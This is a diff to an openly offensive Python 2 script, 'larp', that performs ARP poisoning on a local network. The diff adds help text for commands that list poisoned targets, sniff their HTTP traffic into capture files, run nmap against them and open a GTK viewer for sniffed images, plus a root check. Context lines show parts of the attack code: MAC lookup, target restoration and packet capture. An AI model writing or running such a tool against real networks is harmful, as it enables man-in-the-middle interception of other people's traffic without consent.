@@ -22,13 +22,14 @@ from termcolor import colored
 
 def usage():
     print "%s is a script that performs an arp poisonning attack" % sys.argv[0]
-    print
+    print "-" * 20
     print "Usage:"
     print "\t%s -h    => show this message" % sys.argv[0]
     print "\t%s -a [subnet_mask]  => automate the program" % sys.argv[0]
     print "\t%s -i --interface => provide the interface to use" % sys.argv[0]
     print "\t%s -g --gateway => provide the gateway to arp to" % sys.argv[0]
     print "\t%s -f --file   => provide the file of all of the target" % sys.argv[0]
+    print
     print "Example:"
     print "\t%s -i wlan0 -g 192.168.1.1 -t target_ip_list.txt" % sys.argv[0]
     print "\t%s -i wlan0 -g 192.168.1.1" % sys.argv[0]
@@ -38,6 +39,24 @@ def usage():
     print "\t[!] The above one will implicitly think that you are using wlp2s0"
     print "\t[!] for the interface and 192.168.1.1 for the gateway and using"
     print "\t[!] /tmp/t_ip.txt"
+    print "-" * 20
+    print "Commands:"
+    print "\tl | list => list all of the ip's that are beeing arped"
+    print "\ta | all => drop all on going arps"
+    print "\ts | sniff => sniff a provided ip addr"
+    print "\tn | nmap => nmap a provided ip addr"
+    print "\tg | gtk => open a graphical sniffer for images on a provided ip addr"
+    print
+    print "Example:"
+    print "\t#> a"
+    print "\t[^] Restored: 0.0.0.0"
+    print "\t#> l"
+    print "\t[^] 0 => 0.0.0.0 / ff:ff:ff:ff:ff:ff"
+    print "\t#> s 0"
+    print "\t[^] Sniffing 0 => 0.0.0.0"
+    print "\t[!] Sniffer packet stored in files 10 by 10 and it only sniffs for http"
+    print "\t#> n 0"
+    print "\t[nmap output]"
 
 #------ BHP code ------
 
@@ -55,12 +74,8 @@ def get_mac(ip_address):
     responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
     for s,r in responses:
         return r[Ether].src
-#---GTK 3 Course -----
 
-import gi
-import time
-gi.require_version('Gtk', '3.0')
-from gi.repository import Gtk
+#---GTK 3 Course -----
 
 class ImgDisplay(Gtk.Window):
 
@@ -98,7 +113,6 @@ class ImgDisplay(Gtk.Window):
         if spin_status == False and self.spinner_on:
             self.spinner.stop()
             self.spinner_on = False
-
 
 #---------------------
 
@@ -163,6 +177,10 @@ class larp():
             wrpcap('/tmp/larp_%s/larp_sniffer_%s_%d.cap' % (target_ip, target_ip, f_i), packest)
             f_i += 1
 
+    def img_sniff(self, ip="0.0.0.0"):
+        win = ImgDisplay()
+        Gtk.main()
+
     def main(self):
         t_id = 0    # thread id
         id_map = dict()
@@ -207,6 +225,7 @@ class larp():
                 elif "gtk" in buf or "g" == buf.split(' ')[0]:
                     i = int(buf.split(' ')[1])
                     print colored("[^] Opening Gtk image viewer for %d => %s" % (i, id_map[i][0]), "blue")
+                    self.img_sniff(id_map[i][0])
                 else:
                     self.thread_array[int(buf)].terminate()
                     restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
@@ -216,7 +235,7 @@ class larp():
                         print colored("[^] Stoped sniffer for %s" % id_map[int(buf)][0], "blue")
                     del id_map[int(buf)]
             except:
-                print colored("[!] Available commands: all - list - sniff - nmap", "red")
+                print colored("[!] Available commands: all - list - sniff - nmap - gtk", "red")
         for thread in self.thread_array:
             thread.join()
 
@@ -224,6 +243,10 @@ if __name__ == "__main__":
     interface = None
     gateway = None
     target_file = None
+    if os.geteuid() != 0:
+        print >> sys.stderr, colored("[!] RUN THE PROGRAM AS ROOT!", "red")
+        usage()
+        sys.exit(-1)
     try:
         optlist, args = getopt.getopt(sys.argv[1:], "ha:ig:f:",\
             ["help", "auto", "interface", "gateway", "file"])
